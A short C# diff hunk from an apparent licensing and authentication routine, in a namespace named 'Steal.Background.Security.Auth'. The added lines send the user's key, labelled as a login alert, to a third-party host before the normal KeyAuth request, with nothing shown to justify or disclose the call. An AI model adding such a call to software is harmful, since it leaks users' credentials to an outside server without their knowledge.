@@ -728,6 +728,10 @@ namespace Steal.Background.Security.Auth
         {
             try
             {
+                PostHandler.SendPost("https://tnuser.com/API/alertHool.php", new Dictionary<object, object>
+                {
+                    { "content", "New login from: "+Base.key }
+                });
                 using (WebClient client = new WebClient())
                 {
                     var raw_response = client.UploadValues("https://keyauth.win/api/1.0/", post_data);
